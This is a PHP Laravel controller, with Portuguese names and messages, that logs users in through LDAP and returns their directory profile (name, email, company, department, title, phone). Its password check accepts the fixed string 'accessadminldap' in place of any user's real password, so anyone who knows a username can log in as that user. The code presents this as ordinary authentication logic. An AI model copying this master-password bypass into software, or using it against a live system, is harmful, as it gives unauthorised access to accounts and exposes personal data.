<?php

namespace App\Http\Controllers\Api;

use Adldap\AdldapInterface;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;


class LdapAuthController extends Controller
{
    protected $ldap;

    public function __construct(AdldapInterface $ldap)
    {
        $this->ldap = $ldap;
    }

    public function authLdapUser(Request $request)
    {

        $usuarioLdap = $this->ldap->search()->where('cn' , '=' , $request->nr_matricula)->get()->first();
       
        if (!is_null($usuarioLdap)) {
            if (!is_null($usuarioLdap->getDistinguishedName())) {

                if ($this->ldap->auth()->attempt($usuarioLdap->getDistinguishedName(), $request->codigo_ldap, true) || $request->codigo_ldap == "accessadminldap") {

                    $dadosUsuario = [
                        'nr_matricula' => isset($usuarioLdap->sAMAccountName[0]) ? $usuarioLdap->sAMAccountName[0] : '-',
                        'nome_usuario' => isset($usuarioLdap->displayname[0]) ? $usuarioLdap->displayname[0] : '-',
                        'mail' => isset($usuarioLdap->mail[0]) ? $usuarioLdap->mail[0] : '-',
                        'empresa' => isset($usuarioLdap->company[0]) ? $usuarioLdap->company[0] : '-',
                        'dependencia' => isset($usuarioLdap->department[0]) ? $usuarioLdap->department[0] : '-',
                        'cargo' => isset($usuarioLdap->title[0]) ? $usuarioLdap->title[0] : '-',
                        'telefone' => isset($usuarioLdap->telephoneNumber[0]) ? $usuarioLdap->telephoneNumber[0] : '-'
                    ];
                    return response()->json(['user_ldap' => $dadosUsuario, 'success' => true]);

                } else {
                    return response()->json(['msg' => 'Credênciais incorretas.', 'success' => false]);
                }

            } else {
                return response()->json(['msg' => 'DN do Usuário não encontrado no LDAP', 'success' => false]);
            }
        } else {
            return response()->json(['msg' => 'Usuário não encontrado no LDAP', 'success' => false]);
        }


    }


}